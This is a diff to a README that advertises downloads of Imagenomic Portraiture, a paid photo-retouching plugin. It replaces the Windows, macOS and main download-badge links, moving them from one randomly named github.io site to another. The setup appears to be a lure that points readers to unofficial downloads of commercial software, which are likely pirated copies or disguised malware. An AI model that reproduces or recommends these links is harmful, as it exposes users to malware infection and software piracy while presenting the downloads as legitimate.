@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Imagenomic Portraiture](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_IMAGENOMIC_PORTRAITURE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download Imagenomic Portraiture](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_IMAGENOMIC_PORTRAITURE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Imagenomic Portraiture** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-4A148C?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-4A148C?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-4A148C?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-4A148C?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 </div>
 
